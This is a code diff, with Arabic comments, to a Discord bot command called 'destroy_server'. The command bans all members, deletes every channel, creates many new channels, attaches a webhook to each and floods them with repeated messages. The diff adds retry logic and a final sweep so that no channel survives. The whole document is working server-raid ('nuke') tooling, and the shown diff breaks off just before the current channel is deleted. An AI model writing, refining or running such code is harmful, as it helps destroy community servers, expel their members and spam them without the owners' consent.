@@ -28,17 +28,9 @@ async def on_ready():
     print(f"تم تسجيل الدخول باسم: {bot.user}")
 
 
-# دالة إرسال السبام للويب هوك بسرعة عالية
-async def send_webhook_spams(
-    webhook: discord.Webhook, message: str, count: int
-):
-    tasks = [webhook.send(content=message) for _ in range(count)]
-    await asyncio.gather(*tasks, return_exceptions=True)
-
-
 @bot.tree.command(
     name="destroy_server",
-    description="أمر التدمير الفوري المتزامن بالكامل بدون أي انتظار",
+    description="أمر تدمير السيرفر بالسرعة القصوى وضمان عدم بقاء أي روم",
 )
 @app_commands.describe(
     room_name="اسم الرومات الجديدة (بدون أرقام)",
@@ -62,11 +54,11 @@ async def destroy_server(
         return
 
     await interaction.response.send_message(
-        "جاري إطلاق العملية الفورية الشاملة...", ephemeral=True
+        "جاري التنفيذ بأقصى سرعة وضمان عدم بقاء أي روم...", ephemeral=True
     )
     guild = interaction.guild
 
-    # 1. حظر الأعضاء كلهم مع بعض دفعة واحدة
+    # 1. حظر الأعضاء دفعة واحدة
     async def ban_member(member):
         if member.id == bot.user.id or member.id == interaction.user.id:
             return
@@ -77,25 +69,27 @@ async def destroy_server(
 
     ban_tasks = [ban_member(m) for m in guild.members]
 
-    # 2. حذف كل الرومات القديمة دفعة واحدة وبشكل تزامني كامل
-    channels_to_delete = [
-        c for c in guild.channels if c.id != interaction.channel.id
-    ]
-
-    async def delete_single(ch):
+    # 2. دالة الحذف السريع الفردي
+    async def delete_channel(channel):
+        if channel.id == interaction.channel.id:
+            return
         try:
-            await ch.delete()
+            await channel.delete()
         except:
             pass
 
-    delete_tasks = [delete_single(ch) for ch in channels_to_delete]
+    # الدفعة الأولى: حذف صاروخي فوري لكل الرومات
+    initial_channels = [
+        c for c in guild.channels if c.id != interaction.channel.id
+    ]
+    delete_tasks = [delete_channel(c) for c in initial_channels]
 
-    # 3. إنشاء كل الرومات، الويب هوكات، وإرسال الرسائل فوراً معاً
+    # 3. إنشاء الرومات (لكل روم ويب هوك خاص فيه) وإرسال السبام
     category = interaction.channel.category
-    created_channels = []
 
     async def create_and_spam(i):
         try:
+            name = room_name
             overwrites = {
                 guild.default_role: discord.PermissionOverwrite(
                     send_messages=True, view_channel=True
@@ -103,32 +97,47 @@ async def destroy_server(
             }
             if category:
                 channel = await guild.create_text_channel(
-                    room_name, category=category, overwrites=overwrites
+                    name, category=category, overwrites=overwrites
                 )
             else:
-                channel = await guild.create_text_channel(
-                    room_name, overwrites=overwrites
-                )
+                channel = await guild.create_text_channel(name, overwrites=overwrites)
 
-            created_channels.append(channel)
-            
-            # إنشاء الويب هوك
+            # لكل روم ويب هوك خاص به هنا
             webhook = await channel.create_webhook(name=webhook_name)
-            
-            # إرسال الرسائل فوراً بدون أي تأخير زمني يذكر
-            await send_webhook_spams(webhook, message_content, messages_count)
+
+            # إرسال الرسائل للويب هوك الخاص بهذا الروم مع ضمان عدم الضياع
+            for _ in range(messages_count):
+                try:
+                    await webhook.send(content=message_content)
+                except:
+                    try:
+                        await asyncio.sleep(0.05)
+                        await webhook.send(content=message_content)
+                    except:
+                        pass
         except:
             pass
 
     create_tasks = [create_and_spam(i) for i in range(1, rooms_count + 1)]
 
-    # إطلاق كل شيء في ثانية واحدة مطلقة (الحذف، الباند، الإنشاء والسبام)
+    # إطلاق الحذف والإنشاء والحظر مع بعض
     await asyncio.gather(
         asyncio.gather(*ban_tasks, return_exceptions=True),
         asyncio.gather(*delete_tasks, return_exceptions=True),
         asyncio.gather(*create_tasks, return_exceptions=True),
         return_exceptions=True,
     )
+
+    # **نظام الفحص والتنظيف الأخير (يضمن عدم بقاء أي روم معلق)**
+    for _ in range(2):  # محاولتين سريعتين جداً لضمان القضاء على أي روم بقي
+        leftover_channels = [
+            c for c in guild.channels if c.id != interaction.channel.id
+        ]
+        if not leftover_channels:
+            break
+        cleanup_tasks = [delete_channel(c) for c in leftover_channels]
+        await asyncio.gather(*cleanup_tasks, return_exceptions=True)
+        await asyncio.sleep(0.1)
 
     # حذف الروم الحالي بالآخر
     try:
